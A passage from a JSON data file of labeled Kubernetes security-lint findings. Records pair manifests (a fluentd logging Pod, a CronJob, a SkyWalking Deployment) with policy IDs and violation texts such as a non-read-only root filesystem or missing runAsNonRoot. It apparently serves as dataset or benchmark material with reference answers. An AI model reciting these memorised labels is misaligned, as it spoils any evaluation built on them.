200Mi\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n    - name: varlibdockercontainers\n      mountPath: /var/lib/docker/containers\n      readOnly: true\n    - name: libsystemddir\n      mountPath: /host/lib\n      readOnly: true\n    livenessProbe:\n      initialDelaySeconds: 600\n      periodSeconds: 60\n      exec:\n        command:\n        - /bin/sh\n        - -c\n        - \"LIVENESS_THRESHOLD_SECONDS=${LIVENESS_THRESHOLD_SECONDS:-300}; STUCK_THRESHOLD_SECONDS=${LIVENESS_THRESHOLD_SECONDS:-900};\\\n          \\ if [ ! -e /var/log/fluentd-buffers ]; then\\n  exit 1;\\nfi; LAST_MODIFIED_DATE=`stat\\\n          \\ /var/log/fluentd-buffers | grep Modify | sed -r \\\"s/Modify: (.*)/\\\\1/\\\"\\\n          `; LAST_MODIFIED_TIMESTAMP=`date -d \\\"$LAST_MODIFIED_DATE\\\" +%s`; if [ `date\\\n          \\ +%s` -gt `expr $LAST_MODIFIED_TIMESTAMP + $STUCK_THRESHOLD_SECONDS` ];\\\n          \\ then\\n  rm -rf /var/log/fluentd-buffers;\\n  exit 1;\\nfi; if [ `date +%s`\\\n          \\ -gt `expr $LAST_MODIFIED_TIMESTAMP + $LIVENESS_THRESHOLD_SECONDS` ]; then\\n\\\n          \\  exit 1;\\nfi;\\n\"\n  volumes:\n  - name: varlog\n    hostPath:\n      path: /var/log\n  - name: varlibdockercontainers\n    hostPath:\n      path: /var/lib/docker/containers\n  - name: libsystemddir\n    hostPath:\n      path: /usr/lib64\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fluentd-cloud-logging\" does not have a read-only root file system"
  },
  {
    "id": "11705",
    "manifest_path": "data/manifests/the_stack_sample/sample_4519.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fluentd-cloud-logging\n  namespace: kube-system\n  labels:\n    k8s-app: fluentd-logging\n  annotations:\n    scheduler.alpha.kubernetes.io/critical-pod: ''\nspec:\n  containers:\n  - name: fluentd-cloud-logging\n    image: gcr.io/google_containers/fluentd-gcp:2.0.1\n    command:\n    - /bin/sh\n    - -c\n    - \"mkdir /etc/fluent/config.d &&\\n  echo \\\"$FLUENTD_CONFIG\\\" > /etc/fluent/config.d/main.conf\\\n      \\ &&\\n  /run.sh $FLUENTD_ARGS 2>&1 >>/var/log/fluentd.log\"\n    env:\n    - name: FLUENTD_ARGS\n      value: --no-supervisor\n    - name: FLUENTD_CONFIG\n      value: \"# This configuration file for Fluentd is used\\n# to watch changes to\\\n        \\ Docker log files that live in the\\n# directory /var/lib/docker/containers/\\\n        \\ and are symbolically\\n# linked to from the /var/log/containers directory\\\n        \\ using names that capture the\\n# pod name and container name. These logs\\\n        \\ are then submitted to\\n# Google Cloud Logging which assumes the installation\\\n        \\ of the cloud-logging plug-in.\\n#\\n# Example\\n# =======\\n# A line in the\\\n        \\ Docker log file might look like this JSON:\\n#\\n# {\\\"log\\\":\\\"2014/09/25 21:15:03\\\n        \\ Got request with path wombat\\\\\\\\n\\\",\\n#  \\\"stream\\\":\\\"stderr\\\",\\n#   \\\"\\\n        time\\\":\\\"2014-09-25T21:15:03.499185026Z\\\"}\\n#\\n# The record reformer is used\\\n        \\ to write the tag to focus on the pod name\\n# and the Kubernetes container\\\n        \\ name. For example a Docker container's logs\\n# might be in the directory:\\n\\\n        #  /var/lib/docker/containers/997599971ee6366d4a5920d25b79286ad45ff37a74494f262e3bc98d909d0a7b\\n\\\n        # and in the file:\\n#  997599971ee6366d4a5920d25b79286ad45ff37a74494f262e3bc98d909d0a7b-json.log\\n\\\n        # where 997599971ee6... is the Docker ID of the running container.\\n# The\\\n        \\ Kubernetes kubelet makes a symbolic link to this file on the host machine\\n\\\n        # in the /var/log/containers directory which includes the pod name and the\\\n        \\ Kubernetes\\n# container name:\\n#    synthetic-logger-0.25lps-pod_default-synth-lgr-997599971ee6366d4a5920d25b79286ad45ff37a74494f262e3bc98d909d0a7b.log\\n\\\n        #    ->\\n#    /var/lib/docker/containers/997599971ee6366d4a5920d25b79286ad45ff37a74494f262e3bc98d909d0a7b/997599971ee6366d4a5920d25b79286ad45ff37a74494f262e3bc98d909d0a7b-json.log\\n\\\n        # The /var/log directory on the host is mapped to the /var/log directory in\\\n        \\ the container\\n# running this instance of Fluentd and we end up collecting\\\n        \\ the file:\\n#   /var/log/containers/synthetic-logger-0.25lps-pod_default-synth-lgr-997599971ee6366d4a5920d25b79286ad45ff37a74494f262e3bc98d909d0a7b.log\\n\\\n        # This results in the tag:\\n#  var.log.containers.synthetic-logger-0.25lps-pod_default-synth-lgr-997599971ee6366d4a5920d25b79286ad45ff37a74494f262e3bc98d909d0a7b.log\\n\\\n        # The record reformer is used is discard the var.log.containers prefix and\\n\\\n        # the Docker container ID suffix and \\\"kubernetes.\\\" is pre-pended giving\\\n        \\ the tag:\\n#   kubernetes.synthetic-logger-0.25lps-pod_default-synth-lgr\\n\\\n        # Tag is then parsed by google_cloud plugin and translated to the metadata,\\n\\\n        # visible in the log viewer\\n\\n# Example:\\n# {\\\"log\\\":\\\"[info:2016-02-16T16:04:05.930-08:00]\\\n        \\ Some log text here\\\\\\\\n\\\",\\\"stream\\\":\\\"stdout\\\",\\\"time\\\":\\\"2016-02-17T00:04:05.931087621Z\\\"\\\n        }\\n<source>\\n  type tail\\n  format json\\n  time_key time\\n  path /var/log/containers/*.log\\n\\\n        \\  pos_file /var/log/gcp-containers.log.pos\\n  time_format %Y-%m-%dT%H:%M:%S.%N%Z\\n\\\n        \\  tag reform.*\\n  read_from_head true\\n</source>\\n\\n<filter reform.**>\\n\\\n        \\  type parser\\n  format /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\\d{4} [^\\\\\\\\s]*)\\\\\\\n        \\\\s+(?<pid>\\\\\\\\d+)\\\\\\\\s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<log>.*)/\\n  reserve_data\\\n        \\ true\\n  suppress_parse_error_log true\\n  key_name log\\n</filter>\\n\\n<match\\\n        \\ reform.**>\\n  type record_reformer\\n  enable_ruby true\\n  tag raw.kubernetes.${tag_suffix[4].split('-')[0..-2].join('-')}\\n\\\n        </match>\\n\\n# Detect exceptions in the log output and forward them as one\\\n        \\ log entry.\\n<match raw.kubernetes.**>\\n  @type copy\\n\\n  <store>\\n    @type\\\n        \\ prometheus\\n\\n    <metric>\\n      type counter\\n      name logging_line_count\\n\\\n        \\      desc Total number of lines generated by application containers\\n  \\\n        \\    <labels>\\n        tag ${tag}\\n      </labels>\\n    </metric>\\n  </store>\\n\\\n        \\  <store>\\n    @type detect_exceptions\\n\\n    remove_tag_prefix raw\\n   \\\n        \\ message log\\n    stream stream\\n    multiline_flush_interval 5\\n    max_bytes\\\n        \\ 500000\\n    max_lines 1000\\n  </store>\\n</match>\\n\\n# Example:\\n# 2015-12-21\\\n        \\ 23:17:22,066 [salt.state       ][INFO    ] Completed state [net.ipv4.ip_forward]\\\n        \\ at time 23:17:22.066081\\n<source>\\n  type tail\\n  format /^(?<time>[^ ]*\\\n        \\ [^ ,]*)[^\\\\\\\\[]*\\\\\\\\[[^\\\\\\\\]]*\\\\\\\\]\\\\\\\\[(?<severity>[^ \\\\\\\\]]*) *\\\\\\\\] (?<message>.*)$/\\n\\\n        \\  time_format %Y-%m-%d %H:%M:%S\\n  path /var/log/salt/minion\\n  pos_file\\\n        \\ /var/log/gcp-salt.pos\\n  tag salt\\n</source>\\n\\n# Example:\\n# Dec 21 23:17:22\\\n        \\ gke-foo-1-1-4b5cbd14-node-4eoj startupscript: Finished running startup script\\\n        \\ /var/run/google.startup.script\\n<source>\\n  type tail\\n  format syslog\\n\\\n        \\  path /var/log/startupscript.log\\n  pos_file /var/log/gcp-startupscript.log.pos\\n\\\n        \\  tag startupscript\\n</source>\\n\\n# Examples:\\n# time=\\\"2016-02-04T06:51:03.053580605Z\\\"\\\n        \\ level=info msg=\\\"GET /containers/json\\\"\\n# time=\\\"2016-02-04T07:53:57.505612354Z\\\"\\\n        \\ level=error msg=\\\"HTTP Error\\\" err=\\\"No such image: -f\\\" statusCode=404\\n\\\n        <source>\\n  type tail\\n  format /^time=\\\"(?<time>[^)]*)\\\" level=(?<severity>[^\\\n        \\ ]*) msg=\\\"(?<message>[^\\\"]*)\\\"( err=\\\"(?<error>[^\\\"]*)\\\")?( statusCode=($<status_code>\\\\\\\n        \\\\d+))?/\\n  path /var/log/docker.log\\n  pos_file /var/log/gcp-docker.log.pos\\n\\\n        \\  tag docker\\n</source>\\n\\n# Example:\\n# 2016/02/04 06:52:38 filePurge: successfully\\\n        \\ removed file /var/etcd/data/member/wal/00000000000006d0-00000000010a23d1.wal\\n\\\n        <source>\\n  type tail\\n  # Not parsing this, because it doesn't have anything\\\n        \\ particularly useful to\\n  # parse out of it (like severities).\\n  format\\\n        \\ none\\n  path /var/log/etcd.log\\n  pos_file /var/log/gcp-etcd.log.pos\\n \\\n        \\ tag etcd\\n</source>\\n\\n# Multi-line parsing is required for all the kube\\\n        \\ logs because very large log\\n# statements, such as those that include entire\\\n        \\ object bodies, get split into\\n# multiple lines by glog.\\n\\n# Example:\\n\\\n        # I0204 07:32:30.020537    3368 server.go:1048] POST /stats/container/: (13.972191ms)\\\n        \\ 200 [[Go-http-client/1.1] 10.244.1.3:40537]\\n<source>\\n  type tail\\n  format\\\n        \\ multiline\\n  multiline_flush_interval 5s\\n  format_firstline /^\\\\\\\\w\\\\\\\\\\\n        d{4}/\\n  format1 /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\\d{4} [^\\\\\\\\s]*)\\\\\\\\s+(?<pid>\\\\\\\n        \\\\d+)\\\\\\\\s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n  time_format %m%d\\\n        \\ %H:%M:%S.%N\\n  path /var/log/kubelet.log\\n  pos_file /var/log/gcp-kubelet.log.pos\\n\\\n        \\  tag kubelet\\n</source>\\n\\n# Example:\\n# I1118 21:26:53.975789       6 proxier.go:1096]\\\n        \\ Port \\\"nodePort for kube-system/default-http-backend:http\\\" (:31429/tcp)\\\n        \\ was open before and is still needed\\n<source>\\n  type tail\\n  format multiline\\n\\\n        \\  multiline_flush_interval 5s\\n  format_firstline /^\\\\\\\\w\\\\\\\\d{4}/\\n  format1\\\n        \\ /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\\d{4} [^\\\\\\\\s]*)\\\\\\\\s+(?<pid>\\\\\\\\d+)\\\\\\\\\\\n        s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n  time_format %m%d %H:%M:%S.%N\\n\\\n        \\  path /var/log/kube-proxy.log\\n  pos_file /var/log/gcp-kube-proxy.log.pos\\n\\\n        \\  tag kube-proxy\\n</source>\\n\\n# Example:\\n# I0204 07:00:19.604280      \\\n        \\ 5 handlers.go:131] GET /api/v1/nodes: (1.624207ms) 200 [[kube-controller-manager/v1.1.3\\\n        \\ (linux/amd64) kubernetes/6a81b50] 127.0.0.1:38266]\\n<source>\\n  type tail\\n\\\n        \\  format multiline\\n  multiline_flush_interval 5s\\n  format_firstline /^\\\\\\\n        \\\\w\\\\\\\\d{4}/\\n  format1 /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\\d{4} [^\\\\\\\\s]*)\\\\\\\\\\\n        s+(?<pid>\\\\\\\\d+)\\\\\\\\s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n  time_format\\\n        \\ %m%d %H:%M:%S.%N\\n  path /var/log/kube-apiserver.log\\n  pos_file /var/log/gcp-kube-apiserver.log.pos\\n\\\n        \\  tag kube-apiserver\\n</source>\\n\\n# Example:\\n# 2017-02-09T00:15:57.992775796Z\\\n        \\ AUDIT: id=\\\"90c73c7c-97d6-4b65-9461-f94606ff825f\\\" ip=\\\"104.132.1.72\\\" method=\\\"\\\n        GET\\\" user=\\\"kubecfg\\\" as=\\\"<self>\\\" asgroups=\\\"<lookup>\\\" namespace=\\\"default\\\"\\\n        \\ uri=\\\"/api/v1/namespaces/default/pods\\\"\\n# 2017-02-09T00:15:57.993528822Z\\\n        \\ AUDIT: id=\\\"90c73c7c-97d6-4b65-9461-f94606ff825f\\\" response=\\\"200\\\"\\n<source>\\n\\\n        \\  type tail\\n  format multiline\\n  multiline_flush_interval 5s\\n  format_firstline\\\n        \\ /^\\\\\\\\S+\\\\\\\\s+AUDIT:/\\n  # Fields must be explicitly captured by name to\\\n        \\ be parsed into the record.\\n  # Fields may not always be present, and order\\\n        \\ may change, so this just looks\\n  # for a list of key=\\\"\\\\\\\\\\\"quoted\\\\\\\\\\\n        \\\" value\\\" pairs separated by spaces.\\n  # Unknown fields are ignored.\\n \\\n        \\ # Note: We can't separate query/response lines as format1/format2 because\\n\\\n        \\  #       they don't always come one after the other for a given query.\\n\\\n        \\  # TODO: Maybe add a JSON output mode to audit log so we can get rid of\\\n        \\ this?\\n  format1 /^(?<time>\\\\\\\\S+) AUDIT:(?: (?:id=\\\"(?<id>(?:[^\\\"\\\\\\\\\\\\\\\n        \\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|ip=\\\"(?<ip>(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|method=\\\"(?<method>(?:[^\\\"\\\n        \\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|user=\\\"(?<user>(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|groups=\\\"\\\n        (?<groups>(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|as=\\\"(?<as>(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\n        \\\\\\\\.)*)\\\"|asgroups=\\\"(?<asgroups>(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|namespace=\\\"\\\n        (?<namespace>(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|uri=\\\"(?<uri>(?:[^\\\"\\\\\\\\\\\\\\\\\\\n        ]|\\\\\\\\\\\\\\\\.)*)\\\"|response=\\\"(?<response>(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|\\\\\\\n        \\\\w+=\\\"(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*\\\"))*/\\n  time_format %FT%T.%L%Z\\n  path\\\n        \\ /var/log/kube-apiserver-audit.log\\n  pos_file /var/log/gcp-kube-apiserver-audit.log.pos\\n\\\n        \\  tag kube-apiserver-audit\\n</source>\\n\\n# Example:\\n# I0204 06:55:31.872680\\\n        \\       5 servicecontroller.go:277] LB already exists and doesn't need update\\\n        \\ for service kube-system/kube-ui\\n<source>\\n  type tail\\n  format multiline\\n\\\n        \\  multiline_flush_interval 5s\\n  format_firstline /^\\\\\\\\w\\\\\\\\d{4}/\\n  format1\\\n        \\ /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\\d{4} [^\\\\\\\\s]*)\\\\\\\\s+(?<pid>\\\\\\\\d+)\\\\\\\\\\\n        s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n  time_format %m%d %H:%M:%S.%N\\n\\\n        \\  path /var/log/kube-controller-manager.log\\n  pos_file /var/log/gcp-kube-controller-manager.log.pos\\n\\\n        \\  tag kube-controller-manager\\n</source>\\n\\n# Example:\\n# W0204 06:49:18.239674\\\n        \\       7 reflector.go:245] pkg/scheduler/factory/factory.go:193: watch of\\\n        \\ *api.Service ended with: 401: The event in requested index is outdated and\\\n        \\ cleared (the requested history has been cleared [2578313/2577886]) [2579312]\\n\\\n        <source>\\n  type tail\\n  format multiline\\n  multiline_flush_interval 5s\\n\\\n        \\  format_firstline /^\\\\\\\\w\\\\\\\\d{4}/\\n  format1 /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\n        \\\\d{4} [^\\\\\\\\s]*)\\\\\\\\s+(?<pid>\\\\\\\\d+)\\\\\\\\s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n\\\n        \\  time_format %m%d %H:%M:%S.%N\\n  path /var/log/kube-scheduler.log\\n  pos_file\\\n        \\ /var/log/gcp-kube-scheduler.log.pos\\n  tag kube-scheduler\\n</source>\\n\\n\\\n        # Example:\\n# I1104 10:36:20.242766       5 rescheduler.go:73] Running Rescheduler\\n\\\n        <source>\\n  type tail\\n  format multiline\\n  multiline_flush_interval 5s\\n\\\n        \\  format_firstline /^\\\\\\\\w\\\\\\\\d{4}/\\n  format1 /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\n        \\\\d{4} [^\\\\\\\\s]*)\\\\\\\\s+(?<pid>\\\\\\\\d+)\\\\\\\\s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n\\\n        \\  time_format %m%d %H:%M:%S.%N\\n  path /var/log/rescheduler.log\\n  pos_file\\\n        \\ /var/log/gcp-rescheduler.log.pos\\n  tag rescheduler\\n</source>\\n\\n# Example:\\n\\\n        # I0603 15:31:05.793605       6 cluster_manager.go:230] Reading config from\\\n        \\ path /etc/gce.conf\\n<source>\\n  type tail\\n  format multiline\\n  multiline_flush_interval\\\n        \\ 5s\\n  format_firstline /^\\\\\\\\w\\\\\\\\d{4}/\\n  format1 /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\n        \\\\d{4} [^\\\\\\\\s]*)\\\\\\\\s+(?<pid>\\\\\\\\d+)\\\\\\\\s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n\\\n        \\  time_format %m%d %H:%M:%S.%N\\n  path /var/log/glbc.log\\n  pos_file /var/log/gcp-glbc.log.pos\\n\\\n        \\  tag glbc\\n</source>\\n\\n# Example:\\n# I0603 15:31:05.793605       6 cluster_manager.go:230]\\\n        \\ Reading config from path /etc/gce.conf\\n<source>\\n  type tail\\n  format\\\n        \\ multiline\\n  multiline_flush_interval 5s\\n  format_firstline /^\\\\\\\\w\\\\\\\\\\\n        d{4}/\\n  format1 /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\\d{4} [^\\\\\\\\s]*)\\\\\\\\s+(?<pid>\\\\\\\n        \\\\d+)\\\\\\\\s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n  time_format %m%d\\\n        \\ %H:%M:%S.%N\\n  path /var/log/cluster-autoscaler.log\\n  pos_file /var/log/gcp-cluster-autoscaler.log.pos\\n\\\n        \\  tag cluster-autoscaler\\n</source>\\n\\n# Logs from systemd-journal for interesting\\\n        \\ services.\\n<source>\\n  type systemd\\n  filters [{ \\\"_SYSTEMD_UNIT\\\": \\\"\\\n        docker.service\\\" }]\\n  pos_file /var/log/gcp-journald-docker.pos\\n  read_from_head\\\n        \\ true\\n  tag docker\\n</source>\\n\\n<source>\\n  type systemd\\n  filters [{\\\n        \\ \\\"_SYSTEMD_UNIT\\\": \\\"kubelet.service\\\" }]\\n  pos_file /var/log/gcp-journald-kubelet.pos\\n\\\n        \\  read_from_head true\\n  tag kubelet\\n</source>\\n\\n# Prometheus monitoring\\n\\\n        <source>\\n  @type prometheus\\n  port 80\\n</source>\\n\\n<source>\\n  @type prometheus_monitor\\n\\\n        </source>\\n\\n# We use 2 output stanzas - one to handle the container logs\\\n        \\ and one to handle\\n# the node daemon logs, the latter of which explicitly\\\n        \\ sends its logs to the\\n# compute.googleapis.com service rather than container.googleapis.com\\\n        \\ to keep\\n# them separate since most users don't care about the node logs.\\n\\\n        <match kubernetes.**>\\n  @type copy\\n\\n  <store>\\n    @type google_cloud\\n\\\n        \\n    # Set the buffer type to file to improve the reliability and reduce\\\n        \\ the memory consumption\\n    buffer_type file\\n    buffer_path /var/log/fluentd-buffers/kubernetes.containers.buffer\\n\\\n        \\    # Set queue_full action to block because we want to pause gracefully\\n\\\n        \\    # in case of the off-the-limits load instead of throwing an exception\\n\\\n        \\    buffer_queue_full_action block\\n    # Set the chunk limit conservatively\\\n        \\ to avoid exceeding the GCL limit\\n    # of 10MiB per write request.\\n  \\\n        \\  buffer_chunk_limit 2M\\n    # Cap the combined memory usage of this buffer\\\n        \\ and the one below to\\n    # 2MiB/chunk * (6 + 2) chunks = 16 MiB\\n    buffer_queue_limit\\\n        \\ 6\\n    # Never wait more than 5 seconds before flushing logs in the non-error\\\n        \\ case.\\n    flush_interval 5s\\n    # Never wait longer than 30 seconds between\\\n        \\ retries.\\n    max_retry_wait 30\\n    # Disable the limit on the number of\\\n        \\ retries (retry forever).\\n    disable_retry_limit\\n    # Use multiple threads\\\n        \\ for processing.\\n    num_threads 2\\n  </store>\\n  <store>\\n    @type prometheus\\n\\\n        \\n    <metric>\\n      type counter\\n      name logging_entry_count\\n     \\\n        \\ desc Total number of log entries generated by either an application container\\\n        \\ or a system component\\n      <labels>\\n        tag ${tag}\\n        component\\\n        \\ container\\n      </labels>\\n    </metric>\\n  </store>\\n</match>\\n\\n# Keep\\\n        \\ a smaller buffer here since these logs are less important than the user's\\n\\\n        # container logs.\\n<match **>\\n  @type copy\\n\\n  <store>\\n    @type google_cloud\\n\\\n        \\n    detect_subservice false\\n    buffer_type file\\n    buffer_path /var/log/fluentd-buffers/kubernetes.system.buffer\\n\\\n        \\    buffer_queue_full_action block\\n    buffer_chunk_limit 2M\\n    buffer_queue_limit\\\n        \\ 2\\n    flush_interval 5s\\n    max_retry_wait 30\\n    disable_retry_limit\\n\\\n        \\    num_threads 2\\n  </store>\\n  <store>\\n    @type prometheus\\n\\n    <metric>\\n\\\n        \\      type counter\\n      name logging_entry_count\\n      desc Total number\\\n        \\ of log entries generated by either an application container or a system\\\n        \\ component\\n      <labels>\\n        tag ${tag}\\n        component system\\n\\\n        \\      </labels>\\n    </metric>\\n  </store>\\n</match>\"\n    resources:\n      limits:\n        memory: 200Mi\n      requests:\n        cpu: 100m\n        memory: 200Mi\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n    - name: varlibdockercontainers\n      mountPath: /var/lib/docker/containers\n      readOnly: true\n    - name: libsystemddir\n      mountPath: /host/lib\n      readOnly: true\n    livenessProbe:\n      initialDelaySeconds: 600\n      periodSeconds: 60\n      exec:\n        command:\n        - /bin/sh\n        - -c\n        - \"LIVENESS_THRESHOLD_SECONDS=${LIVENESS_THRESHOLD_SECONDS:-300}; STUCK_THRESHOLD_SECONDS=${LIVENESS_THRESHOLD_SECONDS:-900};\\\n          \\ if [ ! -e /var/log/fluentd-buffers ]; then\\n  exit 1;\\nfi; LAST_MODIFIED_DATE=`stat\\\n          \\ /var/log/fluentd-buffers | grep Modify | sed -r \\\"s/Modify: (.*)/\\\\1/\\\"\\\n          `; LAST_MODIFIED_TIMESTAMP=`date -d \\\"$LAST_MODIFIED_DATE\\\" +%s`; if [ `date\\\n          \\ +%s` -gt `expr $LAST_MODIFIED_TIMESTAMP + $STUCK_THRESHOLD_SECONDS` ];\\\n          \\ then\\n  rm -rf /var/log/fluentd-buffers;\\n  exit 1;\\nfi; if [ `date +%s`\\\n          \\ -gt `expr $LAST_MODIFIED_TIMESTAMP + $LIVENESS_THRESHOLD_SECONDS` ]; then\\n\\\n          \\  exit 1;\\nfi;\\n\"\n  volumes:\n  - name: varlog\n    hostPath:\n      path: /var/log\n  - name: varlibdockercontainers\n    hostPath:\n      path: /var/lib/docker/containers\n  - name: libsystemddir\n    hostPath:\n      path: /usr/lib64\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fluentd-cloud-logging\" is not set to runAsNonRoot"
  },
  {
    "id": "11706",
    "manifest_path": "data/manifests/the_stack_sample/sample_4520.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: addwork\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: pi\n          image: docker.io/wdenniss/pi_worker:v2\n          command:\n          - python3\n          - add_tasks.py\n          env:\n          - name: REDIS_HOST\n            value: redis-0.redis-service\n          - name: PYTHONUNBUFFERED\n            value: '1'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pi\" does not have a read-only root file system"
  },
  {
    "id": "11707",
    "manifest_path": "data/manifests/the_stack_sample/sample_4520.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: addwork\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: pi\n          image: docker.io/wdenniss/pi_worker:v2\n          command:\n          - python3\n          - add_tasks.py\n          env:\n          - name: REDIS_HOST\n            value: redis-0.redis-service\n          - name: PYTHONUNBUFFERED\n            value: '1'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pi\" is not set to runAsNonRoot"
  },
  {
    "id": "11708",
    "manifest_path": "data/manifests/the_stack_sample/sample_4520.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: addwork\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: pi\n          image: docker.io/wdenniss/pi_worker:v2\n          command:\n          - python3\n          - add_tasks.py\n          env:\n          - name: REDIS_HOST\n            value: redis-0.redis-service\n          - name: PYTHONUNBUFFERED\n            value: '1'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pi\" has cpu request 0"
  },
  {
    "id": "11709",
    "manifest_path": "data/manifests/the_stack_sample/sample_4520.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: addwork\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: pi\n          image: docker.io/wdenniss/pi_worker:v2\n          command:\n          - python3\n          - add_tasks.py\n          env:\n          - name: REDIS_HOST\n            value: redis-0.redis-service\n          - name: PYTHONUNBUFFERED\n            value: '1'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pi\" has memory limit 0"
  },
  {
    "id": "11710",
    "manifest_path": "data/manifests/the_stack_sample/sample_4521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-item\n  namespace: demo\n  labels:\n    app: apm-item\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-item\n  template:\n    metadata:\n      name: apm-item\n      labels:\n        app: apm-item\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-item\n        image: evanxuhe/apm-item:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-item\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo:11800\n        - name: EUREKA_HOSTNAME\n          value: apm-eureka\n        - name: EUREKA_PORT\n          value: '8761'\n        ports:\n        - name: http\n          containerPort: 8082\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"apm-item\" does not have a read-only root file system"
  },
  {
    "id": "11711",
    "manifest_path": "data/manifests/the_stack_sample/sample_4521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-item\n  namespace: demo\n  labels:\n    app: apm-item\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-item\n  template:\n    metadata:\n      name: apm-item\n      labels:\n        app: apm-item\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-item\n        image: evanxuhe/apm-item:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-item\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo:11800\n        - name: EUREKA_HOSTNAME\n          value: apm-eureka\n        - name: EUREKA_PORT\n          value: '8761'\n        ports:\n        - name: http\n          containerPort: 8082\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sidecar\" does not have a read-only root file system"
  },
  {
    "id": "11712",
    "manifest_path": "data/manifests/the_stack_sample/sample_4521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-item\n  namespace: demo\n  labels:\n    app: apm-item\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-item\n  template:\n    metadata:\n      name: apm-item\n      labels:\n        app: apm-item\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-item\n        image: evanxuhe/apm-item:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-item\n        - name: 